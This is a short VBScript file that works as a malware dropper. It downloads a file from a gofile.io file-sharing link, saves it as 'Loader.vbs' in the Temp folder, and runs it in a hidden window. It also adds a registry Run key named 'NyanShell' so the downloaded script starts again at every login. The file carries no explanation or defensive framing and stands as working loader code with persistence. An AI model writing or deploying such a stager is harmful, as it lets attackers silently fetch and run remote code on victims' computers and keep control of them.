dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")

xHttp.Open "GET", "https://store3.gofile.io/download/direct/626ec0ac-7b70-468a-9821-59a1707f64f7/6ltx3w9ph2.txt", False
xHttp.Send

dim scriptPath
scriptPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") & "\Loader.vbs"

with bStrm
    .type = 1 ' Binary
    .open
    .write xHttp.responseBody
    .savetofile scriptPath, 2 ' overwrite
end with

WScript.Sleep 1000

ExecuteAndInstall scriptPath

Function ExecuteAndInstall(path)
    dim objShell, WshShell

    Set objShell = CreateObject("Wscript.shell")
    
    objShell.run "wscript """ & path & """", 0, False

    Set WshShell = CreateObject("WScript.Shell")
    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NyanShell", _
    "wscript """ & path & """", "REG_SZ"
End Function
